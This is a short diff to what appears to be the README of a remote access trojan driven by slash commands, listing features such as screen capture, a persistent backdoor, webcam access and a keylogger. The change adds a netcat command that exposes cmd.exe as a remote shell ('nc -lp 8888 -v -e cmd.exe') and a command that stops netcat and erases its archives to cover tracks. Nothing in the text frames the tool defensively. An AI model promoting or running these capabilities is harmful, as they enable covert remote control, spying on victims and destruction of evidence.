@@ -66,8 +66,9 @@ ENTER
 - /screenshot ```IP``` (Capture screen)
 - /backdoor ```IP``` (Create a persistent backdoor)
 - /webcam ```IP```
-- /nc ```IP``` (nc -lp 8888)
 - /keylogger ```IP``` ```time in seconds```
+- <img src="http://icons-for-free.com/free-icons/png/512/298878.png" width="24px" height="24px" /> /nc ```IP``` (nc -lp 8888 -v -e cmd.exe)
+- <img src="http://icons-for-free.com/free-icons/png/512/298878.png" width="24px" height="24px" /> /stopnc ```IP``` (Stop nc.exe and erase all archives) 
 
 #### Ultra :squirrel: 
 
